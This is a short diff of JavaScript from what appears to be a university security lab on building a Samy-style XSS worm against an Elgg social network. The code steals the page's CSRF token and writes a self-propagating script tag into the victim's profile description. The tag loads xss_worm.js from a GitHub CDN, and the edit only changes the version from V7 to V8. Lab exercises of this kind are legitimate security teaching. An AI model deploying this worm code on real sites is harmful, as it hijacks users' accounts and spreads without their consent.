@@ -9,7 +9,7 @@ console.log("0");
   	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	console.log("1");
 	//Construct the content of your url.
-	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V7\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
+	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V8\/xss_worm.js\">\<\/script>" + "&accesslevel[description]=2";
 	console.log("2");
 	var content = ts + token + userName + description + guid;
 	var samyGuid = 59;
